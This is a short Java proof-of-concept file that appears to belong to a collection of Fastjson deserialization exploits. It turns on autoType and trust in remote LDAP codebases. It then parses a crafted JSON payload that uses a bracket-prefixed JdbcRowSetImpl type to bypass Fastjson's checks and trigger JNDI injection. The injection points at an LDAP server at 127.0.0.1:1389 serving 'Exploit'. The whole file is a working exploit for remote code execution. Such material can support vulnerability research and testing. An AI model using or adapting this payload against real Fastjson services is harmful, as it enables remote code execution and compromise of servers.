package com.example.fastjson220523poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * https://paper.seebug.org/1192/#ver1268
 */
public class JNDI1243 {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        String payload = "{\"rand1\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true]}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload);
    }
}
